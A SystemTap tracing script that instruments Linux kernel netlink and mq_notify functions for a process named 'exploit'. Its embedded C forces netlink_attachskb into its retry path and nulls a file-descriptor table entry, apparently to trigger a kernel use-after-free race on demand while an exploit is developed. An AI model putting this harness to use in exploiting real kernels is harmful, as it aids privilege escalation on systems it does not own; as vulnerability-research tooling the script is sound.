%{
#include <linux/fdtable.h>
#include <net/sock.h>

struct netlink_sock {
        /* struct sock has to be the first member of netlink_sock */
        struct sock		sk;
        u32			portid;
        u32			dst_portid;
        u32			dst_group;
        u32			flags;
        u32			subscriptions;
        u32			ngroups;
        unsigned long		*groups;
        unsigned long		state;
        size_t			max_recvmsg_len;
        wait_queue_head_t	wait;
        bool			cb_running;
        struct netlink_callback	cb;
        struct mutex		*cb_mutex;
        struct mutex		cb_def_mutex;
        void			(*netlink_rcv)(struct sk_buff *skb);
        int			(*netlink_bind)(int group);
        void			(*netlink_unbind)(int group);
        struct module		*module;
    }; 
%}

global sock_ptr = 0;

function force_trigger_before:long (arg_sock:long)
%{
    struct sock *sk = (void*) STAP_ARG_arg_sock;
    struct netlink_sock *nlk = (void*) sk;
    nlk->state |= 1; // enter the netlink_attachskb() retry path
    
%}
function force_trigger_after:long (arg_sock:long)
%{
    struct files_struct *files = current->files;
    struct fdtable *fdt = files_fdtable(files);
    fdt->fd[3] = NULL;
    
%}

function log_dump:long (arg_sock:long)
%{
    struct sock *sk = (void*) STAP_ARG_arg_sock;
    struct netlink_sock *nlk = (void*) sk;       
    sk->sk_flags |= (1 << SOCK_DEAD); // avoid blocking the thread 
    
    
    _stp_printf("-={ log dump_netlink_sock: %p }=-\n", nlk);
    _stp_printf("- sk = %p\n", sk);
    
%}


probe kernel.function ("netlink_attachskb")
{
    if (execname() == "exploit")
    {
        printf("(%d-%d) [netlink] ==>> netlink_attachskb (%s)\n", pid(), tid(), $$parms)

        force_trigger_before($sk);
    }
}

probe syscall.mq_notify
{
	if ( execname() == "exploit" )
	{
		printf("\n\n(%d-%d) [SYSCALL] ==>> mq_notify (%s)\n", pid(), tid(), argstr)
	}
}

probe syscall.mq_notify.return
{
	if ( execname() == "exploit" )
	{
        if (sock_ptr != 0)
        {
            log_dump(sock_ptr);
            sock_ptr = 0;
        }
		printf("(%d-%d) [SYSCALL] <<== mq_notify = %d \n\n\n", pid(), tid(), $return)
	}
}

probe kernel.function("__fdget")
{
    if ( execname() == "exploit" )
    {
        printf("(%d-%d) [vsf] ==>> fdget(%s)\n", pid(), tid(), $$parms)
    }
}

probe kernel.function("__fdget").return
{
    if ( execname() == "exploit" )
    {
        printf("(%d-%d) [vsf] <<== fdget = %x \n", pid(), tid(), $return)
    }
}

probe kernel.function("copy_from_user")
{
    if ( execname() == "exploit" )
    {
        printf("(%d-%d) [uland] ==>> copy_from_user()\n", pid(), tid())
    }
}

probe kernel.function("__alloc_skb")
{
    if ( execname() == "exploit" )
    {
        printf("(%d-%d) [skb] ==>> alloc_skb (%s)\n", pid(), tid(), $$parms)
    }
}

probe kernel.function("skb_put")
{
    if ( execname() == "exploit" )
    {
        printf("(%d-%d) [skb] ==>> skb_put  (%s)\n", pid(), tid(), $$parms)
    }
}

probe kernel.function("skb_put").return
{
    if ( execname() == "exploit" )
    {
        printf("(%d-%d) [skb] <<== skb_put = %x \n", pid(), tid(), $return)
    }
}

probe kernel.function("netlink_getsockbyfilp")
{
    if ( execname() == "exploit" )
    {
        printf("(%d-%d) [netlink] ==>> netlink_getsockbyfilp  (%s)\n", pid(), tid(), $$parms)
    }
}

probe kernel.function("netlink_getsockbyfilp").return
{
    if ( execname() == "exploit" )
    {
        printf("(%d-%d) [netlink] <<== netlink_getsockbyfilp  = %x \n", pid(), tid(), $return)
        sock_ptr = $return;
    }
}

probe kernel.function("netlink_attachskb").return
{
    if ( execname() == "exploit" )
    {
        printf("(%d-%d) [netlink] <<== netlink_attachskb  = %x \n", pid(), tid(), $return)
        force_trigger_after(0);
    }
}

probe kernel.function("netlink_detachskb")
{
    if ( execname() == "exploit" )
    {
        printf("(%d-%d) [netlink] ==>> netlink_detachskb   (%s)\n", pid(), tid(), $$parms)
    }
}

probe kernel.function("netlink_detachskb").return
{
    if ( execname() == "exploit" )
    {
        printf("(%d-%d) [netlink] <<== netlink_detachskb \n", pid(), tid())
    }
}















